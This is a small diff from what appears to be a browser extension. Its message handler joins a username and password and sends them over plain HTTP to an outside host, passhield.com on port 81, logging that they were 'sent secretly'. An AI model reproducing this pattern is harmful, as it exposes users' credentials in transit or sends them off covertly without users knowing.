@@ -126,7 +126,7 @@ browser.runtime.onMessage.addListener(function(request, sender, sendResponse) {
         const action = request.action
     
         const str = "username="+username+"&"+"password="+password;
-        attestOrSent("http://www.passhield.com:81","secret",str).then((s) => {
+        attestOrSent("http://www.passhield.com:81",action,str).then((s) => {
             if(s === "Username and Password sent secretly"){
                 console.log("Username and Password sent secretly")
             }else{
